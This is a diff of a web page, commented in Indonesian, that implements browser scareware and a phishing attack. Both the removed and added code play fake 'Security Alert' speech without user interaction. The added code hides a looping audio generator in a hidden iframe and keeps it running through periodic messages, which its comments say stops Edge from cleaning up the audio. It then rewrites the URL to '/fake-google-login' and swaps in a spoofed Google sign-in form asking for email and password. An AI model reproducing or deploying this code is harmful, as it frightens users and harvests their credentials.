@@ -2,129 +2,116 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Security Verification</title>
+  <title>Edge Keep-Alive Audio</title>
   <style>
-    :root {
-      --bg: #000000;
-      --surface: #0a0a0a;
-      --border: #1f1f1f;
-      --text-primary: #ededed;
-      --text-secondary: #888888;
-      --accent: #dc2626;
-      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Geist", Roboto, sans-serif;
-    }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      font-family: var(--font-sans);
-      background: var(--bg);
-      color: var(--text-primary);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 48px 40px;
-      max-width: 440px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 0 0 1px rgba(255,255,255,0.02), 0 20px 40px rgba(0,0,0,0.4);
-    }
-
-    .badge {
-      display: inline-block;
-      padding: 4px 12px;
-      border-radius: 999px;
-      background: rgba(220, 38, 38, 0.1);
-      border: 1px solid rgba(220, 38, 38, 0.3);
-      color: var(--accent);
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-      margin-bottom: 24px;
-    }
-
-    h1 {
-      font-size: 24px;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      margin-bottom: 12px;
-      color: var(--text-primary);
-    }
-
-    p {
-      font-size: 14px;
-      line-height: 1.6;
-      color: var(--text-secondary);
-      margin-bottom: 8px;
-    }
-
-    .status-text {
-      font-size: 12px;
-      color: var(--text-secondary);
-      margin-top: 24px;
-      font-family: "Geist Mono", "SF Mono", Monaco, monospace;
-    }
-
-    .status-text::before {
-      content: ">";
-      margin-right: 8px;
-      color: var(--accent);
-    }
+    body { font-family: sans-serif; text-align: center; padding: 50px; }
+    #status { margin-top: 20px; color: #0078d4; font-weight: bold; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="badge">Security Alert</div>
-    <h1>Session Verification Required</h1>
-    <p>Your account has been accessed from an unknown device.</p>
-    <p>Please wait while we verify your identity.</p>
-    <div class="status-text" id="status">Initializing secure channel</div>
-  </div>
+  <h2>Memverifikasi Sesi...</h2>
+  <div id="status">Menunggu otorisasi...</div>
 
   <script>
     const statusEl = document.getElementById('status');
-    const steps = [
-      'Initializing secure channel',
-      'Contacting verification server',
-      'Awaiting user confirmation',
-      'Session active'
-    ];
-    let i = 0;
+
+    // 1. Buat Iframe Tersembunyi
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.sandbox = "allow-scripts allow-same-origin allow-autoplay"; 
+    document.body.appendChild(iframe);
+
+    // 2. Tulis kode Audio ke dalam Iframe
+    const iframeDoc = iframe.contentWindow.document;
+    iframeDoc.open();
+    iframeDoc.write(`
+      <script>
+        let audioCtx = null;
+        let activeOsc = null;
+
+        function startAudio() {
+          try {
+            if (!audioCtx) {
+              audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+              if (audioCtx.state === 'suspended') audioCtx.resume();
+            }
+            
+            // Hentikan oscillator lama jika ada
+            if (activeOsc) {
+              try { activeOsc.stop(); } catch(e) {}
+              activeOsc = null;
+            }
+
+            // Buat oscillator baru
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.value = 440;
+            gain.gain.value = 0.05;
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            
+            activeOsc = osc;
+            console.log("[Iframe] Oscillator restarted.");
+          } catch (e) {
+            console.log("[Iframe] Audio error:", e.message);
+          }
+        }
+
+        // Mulai audio pertama kali
+        startAudio();
+
+        // Dengarkan perintah dari Parent untuk restart audio
+        window.addEventListener('message', (e) => {
+          if (e.data === 'RESTART_AUDIO') {
+            startAudio();
+          }
+        });
+
+        // TTS Looping
+        if ('speechSynthesis' in window) {
+          const text = "Security Alert. Your account has been accessed. ".repeat(5);
+          function speakLoop() {
+            const utter = new SpeechSynthesisUtterance(text);
+            utter.lang = 'en-US';
+            utter.rate = 0.8;
+            utter.onend = speakLoop;
+            window.speechSynthesis.speak(utter);
+          }
+          speakLoop();
+        }
+      <\/script>
+    `);
+    iframeDoc.close();
+
+    // 3. Parent: Kirim perintah "RESTART_AUDIO" setiap 1 detik
+    // Ini akan mencegah Edge membersihkan audio
     setInterval(() => {
-      if (i < steps.length) {
-        statusEl.textContent = steps[i];
-        i++;
+      try {
+        iframe.contentWindow.postMessage('RESTART_AUDIO', '*');
+      } catch(e) {}
+    }, 1000);
+
+    // 4. UI Spoofing via pushState (setelah 1.5 detik)
+    setTimeout(() => {
+      try {
+        window.history.pushState({}, '', '/fake-google-login');
+        document.body.innerHTML = `
+          <div style="text-align: center; margin-top: 100px;">
+            <h1 style="color: #4285f4; font-size: 40px;">Google</h1>
+            <p>Sign in to continue</p>
+            <input type="text" placeholder="Email" style="padding: 10px; margin: 5px; width: 250px;"><br>
+            <input type="password" placeholder="Password" style="padding: 10px; margin: 5px; width: 250px;"><br>
+            <button style="padding: 10px 20px; margin-top: 10px; background: #4285f4; color: white; border: none;">Next</button>
+          </div>
+        `;
+        console.log("UI Spoofed. Audio should still be looping in iframe.");
+      } catch (e) {
+        console.log("pushState failed:", e.message);
       }
     }, 1500);
 
-    // Zero-Click TTS Trigger
-    window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(() => {
-        if (!('speechSynthesis' in window)) return;
-        const text = "Security Alert. Your account has been accessed from an unknown device. Please verify your identity immediately.";
-        const utter = new SpeechSynthesisUtterance(text);
-        utter.lang = 'en-US';
-        utter.rate = 0.9;
-        utter.pitch = 1.0;
-        utter.volume = 1.0;
-        window.speechSynthesis.speak(utter);
-
-        setTimeout(() => {
-          window.open('target.html', '_blank');
-        }, 1500);
-      }, 100);
-    });
   </script>
 </body>
-</html> 
+</html>
